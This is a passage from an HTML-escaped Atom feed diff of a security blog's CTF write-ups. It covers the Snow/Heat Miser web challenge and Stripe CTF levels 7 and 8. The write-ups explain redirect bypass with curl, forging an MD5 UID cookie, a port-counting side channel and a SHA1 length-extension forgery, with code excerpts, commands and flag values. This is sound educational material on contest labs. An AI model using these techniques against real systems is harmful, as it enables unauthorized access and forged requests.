+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Location: noaccess.php&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="nv"&gt;$accessallowed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$zone&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;../include/template.inc.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now we know how the One Time Passwords are generated. We just have to
+send the correct SHA1 sum, using the server's current time, which we can
+find in the source code of the noaccess.php page.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="zone-5"&gt;
+&lt;h3&gt;Zone 5&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;3ab1c5fa327343721bc798f116be8dc6&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Game over for the North Pole.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="heat-miser"&gt;
+&lt;h2&gt;&lt;a class="reference external" href="http://heatmiser.counterhack.com/"&gt;Heat Miser&lt;/a&gt;&lt;/h2&gt;
+&lt;div class="section" id="id1"&gt;
+&lt;h3&gt;Zone 0&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;1732bcff12e6550ff9ea44d594001418&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We had a security concern where the Zone 1 URL ended up in search
+engine results. We added a file to prevent the search engines from
+caching these pages. The system is now secure an no unauthorized
+users have access to the URL.&lt;/p&gt;
+&lt;p&gt;Don't even try to access the other zones, because you won't be able
+to. And if you are helping my brother, GO AWAY!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The important part here is the file to prevent indexing by search
+engines. Heat Miser is talking about the robots.txt file, which tells
+search engine crawlers what page they can crawl. By loading this file,
+we find the wanted URL: zone-1-E919DBF1-E4FA-4141-97C4-3F38693D2161.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="id2"&gt;
+&lt;h3&gt;Zone 1&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;d8c94233daef256c42bb95bd61382e02&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+We had an issue with Zone 2 and we had to temporarily remove the
+link. It is now back and in full operation. We appoligize to those
+living in Zone 2 as it may have gotten a tad chilly. Everything is
+fully operational now.&lt;/blockquote&gt;
+&lt;p&gt;Looking at the comment will give you the URL to the next zone:
+zone-2-761EBBCF-099F-4DB0-B63F-9ADC61825D49&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="id3"&gt;
+&lt;h3&gt;Zone 2&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;ef963731de7e886226fe4a6a6c2971f1&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+We are sorry, but due to the negligence of one of our fiery minions,
+we had to change the link for Zone 3. If you should have access then
+you should have received an email. The new zone 3 link starts with
+zone-3-83FEE8BE-B1C6-4395-A56A-XXXXXXXXXXXX.&lt;/blockquote&gt;
+&lt;p&gt;There are 281,474,976,710,656 possibilities for the last set of numbers,
+so don't bother brute forcing it. Once again, we have an incomplete URL.
+But Heat Miser tweets this message:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/heat_miser_tweet_1.png"&gt;&lt;img alt="heat_miser_tweet_1" src="/images/heat_miser_tweet_1.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The tweeted image is:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/heat_miser_transparent_terminal.png"&gt;&lt;img alt="heat_miser_transparent_terminal" src="/images/heat_miser_transparent_terminal.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;And, as Snow Miser says:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_tweet_2.png"&gt;&lt;img alt="snow_miser_tweet_2" src="/images/snow_miser_tweet_2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This is looks just like the first level of Snow Miser. Using GIMP, we
+can make the end of the URL appear:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/heat_miser_transparent_terminal_enhanced.png"&gt;&lt;img alt="heat_miser_transparent_terminal_enhanced" src="/images/heat_miser_transparent_terminal_enhanced.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Which gives us the URL: zone-3-83FEE8BE-B1C6-4395-A56A-BF933FC85254&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="id4"&gt;
+&lt;h3&gt;Zone 3&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;0d524fb8d8f9f88eb9da5b286661a824&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We added a new security mechanism to Zone 4 so it won't matter if
+SOMEONE LEAKS IT AGAIN!&lt;/p&gt;
+&lt;p&gt;Zone 4 (zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We can directly access zone 4, since Heat Miser posts a link to it. But
+when we click it, we're redirected to another page, noaccess.php. The
+hint comes from a tweet from Snow Miser:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_tweet_3.png"&gt;&lt;img alt="snow_miser_tweet_3" src="/images/snow_miser_tweet_3.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The tweeted image is from &lt;a class="reference external" href="http://knowyourmeme.com/memes/the-most-interesting-man-in-the-world"&gt;the most interesting man in the
+world&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_most_interesting_man.jpg"&gt;&lt;img alt="snow_miser_most_interesting_man" src="/images/snow_miser_most_interesting_man.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Heat Miser redirects us, using a code:&lt;cite&gt;header(&amp;quot;location: new_url&amp;quot;);&lt;/cite&gt;, but
+forgets to use the :code`exit` function. It
+means that the rest of the page is executed, then sent to our browser,
+with a Location header, which our browser follows. But if we use a
+client which does not follow redirection, we can recover the first page.:&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+$ curl
+&amp;quot;http://heatmiser.counterhack.com/zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B/&amp;quot;
+&amp;gt; zone-4
+$ grep &amp;quot;zone-5&amp;quot; zone-4
+Link to &amp;lt;a href=&amp;quot;/zone-5-15614E3A-CEA7-4A28-A85A-D688CC418287/&amp;quot;&amp;gt;Zone 5&amp;lt;/a&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class="section" id="id5"&gt;
+&lt;h3&gt;Zone 4&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;e3ae414e6d428c3b0c7cff03783e305f&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Okay, we have the URL to zone 5, but when we try to access it directly,
+we're redirected again to noaccess.php. To give us a clue about where to
+look, Snow Miser tweets:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_tweet_4.png"&gt;&lt;img alt="snow_miser_tweet_4" src="/images/snow_miser_tweet_4.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;So, we know that we should look at the cookies. There's only one:
+&lt;code&gt;UID=b8c37e33defde51cf91e1e03e51657da&lt;/code&gt;. A 32 byte hex string:
+it looks like a MD5 hash. If we reverse it (using online tools, or
+programs like John The Ripper), we find that it's the hash of the string
+&amp;quot;1001&amp;quot;, which explains Snow Miser's tweet.&lt;/p&gt;
+&lt;p&gt;A value like 1001, and a name like UID indicates that this hash
+corresponds to a user ID, and an unprivileged one, since he can't access
+zone 5. The first value I tried was a UID of 0 (which means a MD5 of
+&lt;code&gt;cfcd208495d565ef66e7dff9f98764da&lt;/code&gt;) since it's root's UID on
+Linux, but it turned out that the correct value was 1 (which means a MD5
+of &lt;code&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/code&gt;). We modify the cookie's
+value, and we reload the page to access zone 5.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="id6"&gt;
+&lt;h3&gt;Zone 5&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;f478c549e37fa33467241d847f862e6f&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Game over for Southtown.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="conclusion"&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;I'll give it to you: this challenge wasn't really complicated. Mostly
+because the first zones of both controllers where kinda easy, but also
+because of all the hints in the tweets. Yet, I'm still glad I did it
+because:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;I learned the SVN vulnerability&lt;/li&gt;
+&lt;li&gt;I learned common mistakes, like forgetting :code`exit` after a
+redirect&lt;/li&gt;
+&lt;li&gt;I added new tricks to my &amp;quot;to-do&amp;quot; list when looking for
+vulnerability/information disclosure (like the use of steghide, or
+looking at files in docs leaks)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I hoped this wasn't too long, and that you learned something from it. I
+wish you a merry Christmas, a happy new year, and lots of pentesting ;)&lt;/p&gt;
+&lt;p&gt;Cheers.&lt;/p&gt;
+&lt;/div&gt;
+</summary></entry><entry><title>Stripe CTF: Level #8</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-8.html" rel="alternate"></link><updated>2012-12-15T20:06:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-15:stripe-ctf-level-8.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level08-logo.jpg"&gt;&lt;img alt="level08-logo" src="/images/level08-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/stripe-ctf-level08.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;d211aa240a0a59eb1f56d3c42a55080d0e27eea2c04bc4410bf608824c847c96&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This is it. The final level to the Stripe CTF. The goal here is to
+retrieve a 12-digit password, which is too long to brute force. Let's
+see how we can use the protocol to our advantage.&lt;/p&gt;
+&lt;p&gt;The infrastructure looks like this:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;a central server, used to verify the password&lt;/li&gt;
+&lt;li&gt;four &amp;quot;chunk&amp;quot; servers, which each knows only a part of the password&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;When you send a password to the central server, it cuts it in four
+pieces, and procedes like this:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;it asks the first chunk server if the first piece is correct&lt;/li&gt;
+&lt;li&gt;if not, it sends a failure message to the client (and doesn't contact
+any other chunk server)&lt;/li&gt;
+&lt;li&gt;if it is, it asks the second chunk server if the second piece is
+correct&lt;/li&gt;
+&lt;li&gt;etc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Furthermore, we can give the server a list of webhooks, to which it'll
+send the result.&lt;/p&gt;
+&lt;p&gt;Seeing the password verification protocol, I know what you're thinking:
+timing attack. Seeing how much time the server takes to respond, we can
+find how many chunk servers it contacted, thus how many chunk we
+correctly found. Instead of &lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; possibilities, we're down to
+&lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt; possibilities, which is feasible.&lt;/p&gt;
+&lt;p&gt;The problem is that the server has a way to prevent timing attack:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File primary_server, line 58&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nextServerCallback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;parsed_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="c"&gt;# Chunk was wrong!&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;parsed_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
+        &lt;span class="c"&gt;# Defend against timing attacks&lt;/span&gt;
+        &lt;span class="n"&gt;remaining_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expectedRemainingTime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Going to wait &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; seconds before responding&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;
+        &lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callLater&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendResult&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt;
+
+    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkNext&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If a chunk is wrong, the server waits before telling the client he made
+a mistake. So we can't use a timing attack.&lt;/p&gt;
+&lt;p&gt;But there is another way to know how many chunk servers the primary
+server contacted, and thus go from &lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; to &lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt;
+the webhooks. Here is the idea:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;when the primary server communicates with an external resource
+(whether it's a chunk server or a webhook), it opens a socket&lt;/li&gt;
+&lt;li&gt;every time the primary server opens a socket, its client port is
+incremented by one&lt;/li&gt;
+&lt;li&gt;the webhook knows the client port of the primary server&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;So, by looking at how much was the client port incremented between two
+responses, the webhook knows how many chunk servers were contacted.
+Indeed, let's say the first chunk is wrong: the primary server connects
+to the first chunk server, then to the webhook. The port is therefore
+incremented by two. If the first chunk is correct, but not the second is
+wrong, the primary servers contacts the first chunk server, the second
+chunk server, then the webhook. The port is incremented by three, etc.&lt;/p&gt;
+&lt;p&gt;So, knowing this we can't find the correct chunks, but we can eliminate
+the bad chunks, which is faster than bruteforcing the whole password,
+but still takes a lot of time. What's more, the primary server can only
+contact webhooks with URL ending with .stripe-ctf.com (in the production
+environment). Fortunately, we still have access to the level 2 server
+(remember, the one with the upload vulnerability?) We can upload an SSH
+key, connect, and then launch our webhook.&lt;/p&gt;
+&lt;p&gt;Unfortunately, I lost the source code of my custom webhook (sorry about
+that!). It was based on a webhook coded by a friend of Lopi. Basically,
+it tried every possible combination, chunk by chunk, and eliminated the
+bad ones as it did so.&lt;/p&gt;
+&lt;p&gt;The attack took something like two days, because I kept being
+disconnected of the server, and because there were so many people on it
+running their own webhook. I think it was kind of stubborn from Stripe
+to force the webhook to be on one of their server.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level08-scumbag-stripe.png"&gt;&lt;img alt="level08-scumbag-stripe" src="/images/level08-scumbag-stripe.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Anyway, after some time, you find the correct password, which you submit
+to the Stripe web site.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level08-w00t.png"&gt;&lt;img alt="level08-w00t" src="/images/level08-w00t.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+&lt;p&gt;That's it for the Stripe CTF! I know I took a lot of time writing these
+write ups, but I learned a lot from this competition, especially the
+SHA1 padding attack, how to find where to put my Javascript so it's
+executed, and how to obfuscate it. Plus I won a super cool t-shirt!&lt;/p&gt;
+&lt;p&gt;See you for another CTF!&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/stripe-ctf-prize.jpg"&gt;&lt;img alt="stripe-ctf-prize" src="/images/stripe-ctf-prize.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #7</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-7.html" rel="alternate"></link><updated>2012-12-09T15:07:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-09:stripe-ctf-level-7.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level07-logo.jpg"&gt;&lt;img alt="level07-logo" src="/images/level07-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code for this level
+&lt;a class="reference external" href="/docs/stripe-ctf-level07.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;This level is the most delicious of all: you can order waffles online,
+and the company will have them delivered to the location you specified.
+There are seven types of waffle: veritaffle, belgian, brussels, eggo,
+chicken (premium), dream (premium), and the king of waffles, liege
+(premium). You have an unprivileged account (login: ctf, password:
+password), so you can't order premium waffles. Yet, your goal is to
+order the supreme waffle: the liege. There are four other users on the
+website: larry (premium account), randall (premium account), alice and
+bob. Every user has an ID, and a secret (which has the form of a random
+string).&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level07-ctf-user-interface.png"&gt;&lt;img alt="level07-ctf-user-interface" src="/images/level07-ctf-user-interface.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The company provides you with a client API you can use to order waffles.
+Every order is of the form:
+&lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&lt;/code&gt;. Then, a
+signature is computed using the client's secret, and appended to the
+order. The signature is of the form:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File client.py, line 61&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;api_secret&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c"&gt;# signature = SHA1(secret + message)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We can view our past orders at the URL /logs/id.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level07-ctf-order.png"&gt;&lt;img alt="level07-ctf-order" src="/images/level07-ctf-order.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;But what if we change the ID in the URL?&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level07-larry-order.png"&gt;&lt;img alt="level07-larry-order" src="/images/level07-larry-order.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level07-barry-order.png"&gt;&lt;img alt="level07-barry-order" src="/images/level07-barry-order.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Bingo, we are now viewing larry's and randall's past orders. But since
+they didn't order any liege, we can't use these orders as is. Let's see
+in the code how the order is checked:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File wafflecopter.py, line 139&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parse_params&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;pairs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;That's the code which parse the body of the order. We can see that they
+don't check if a parameter has been specified more than once. So if you
+send an order of the form:
+&lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&amp;amp;waffle=YYY&lt;/code&gt;,
+the last waffle will be ordered (in this case, YYY).&lt;/p&gt;
+&lt;p&gt;Great, so we can just take a previous order from larry, append
+&lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt; to the end, and send it to the server!
+Actually, we can't, because of the signature: if we change the order,
+but not the signature, they won't match, and the server will refuse to
+carry our order. So we need to change the signature. But how can we do
+that without knowing larry's secret? The key here is cryptography.&lt;/p&gt;
+&lt;p&gt;Like we said earlier, the signature is computed via &lt;code&gt;SHA1(secret +
+message)&lt;/code&gt;. But the SHA1 function follows the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"&gt;Merkle–Damgård
+construction&lt;/a&gt;.
+Basically, the message is broken up in equal blocks of 512 bits. Then,
+computation is done on the first block and produces an output. This
+output is used to perform the same computation on the second block, and
+so on. So, it means that given &lt;code&gt;SHA1(secret + message)&lt;/code&gt; and the
+length of &lt;code&gt;secret&lt;/code&gt;, we can compute &lt;code&gt;SHA1(secret + message +
+message_modifier)&lt;/code&gt;. And that's exactly what we want, to append
+something (here, &lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt;) at the end of the message.&lt;/p&gt;
+&lt;p&gt;I started searching for a Python implementation of SHA1, and wanted to
+modify it so that it would compute my forged signature, but it took too
+much time. Fortunately, two guys I was working with on the CTF,
+&lt;a class="reference external" href="https://twitter.com/_Lopi_"&gt;lopi&lt;/a&gt; and mark, &lt;a class="reference external" href="http://www.vnsecurity.net/2010/03/codegate_challenge15_sha1_padding_attack/"&gt;found this piece of
+code&lt;/a&gt;,
+which could forge the signature for us.:&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+$ python sha-padding.py
+usage: sha-padding.py &amp;lt;original_message&amp;gt; &amp;lt;original_signature&amp;gt;
+&amp;lt;text_to_append&amp;gt;
+$ python sha-padding.py 14
+&amp;quot;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&amp;quot;
+78943cff885d4b41ff058aa64a36520e66ffdbbe &amp;quot;&amp;amp;waffle=liege&amp;quot;
+new msg:
